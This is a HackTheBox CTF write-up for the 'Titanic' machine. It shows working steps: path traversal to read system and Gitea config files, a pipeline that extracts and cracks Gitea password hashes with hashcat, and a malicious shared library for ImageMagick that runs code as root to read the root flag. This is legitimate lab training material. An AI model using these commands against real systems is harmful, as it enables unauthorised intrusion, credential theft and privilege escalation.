---
title: HackTheBox | Titanic
published: 2025-02-21
description: "In this writeup, I explain how I gain ownership of Titanic on HackTheBox"
image: "./img/img.jpg"
tags: [CTF, HTB, write-up]
category: 'CTF'
draft: false
---


# Nmap Scan

```bash
sudo nmap -sC -sV -T4 10.10.11.55
```
![nmap](image.png)

While exploring the website, I found a Book Your Trip button that triggers a form submission.


![button](image-1.png)

after filing the form and intercept the request with burpsuite, following the redirection

i find /download?ticket= path i tried path traversal and it worked

there is user names developer we can get the user flag from `/home/developer/user.txt`

![pathtraversal](image-2.png)

we continue to see if we can access `/etc/hosts` i found subdomain `dev`

![dev](image-3.png)

add it to my hosts

the app is using gitea so searching for its configuration i found this path

```bash
curl -X GET "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini"
```

![cong](image-4.png)

we can see the db is located at `/data/gitea/gitea.db`

after downloading the db we can access it with 
```bash
sqlite3 _home_developer_gitea_data_gitea_gitea.db
```

![db](image-5.png)

from `htb-compiled` writeup i found how to crack the hash

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes

hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
```

i found the developer password

![pass](image-6.png)

time for ssh

```bash
ssh developer@10.10.11.55
```

looking around i found this :
![scripts](image-7.png)

the script is runing as root, and whit the version i took look at google i found this PoC

[Arbitrary Code Execution in `AppImage` version `ImageMagick`](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

now we can try get the flag :

```bash
gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root44_flag.txt");
    exit(0);
}
EOF

touch test.jpg
```

we can find the flag at `/tmp`

![win](image-8.png)
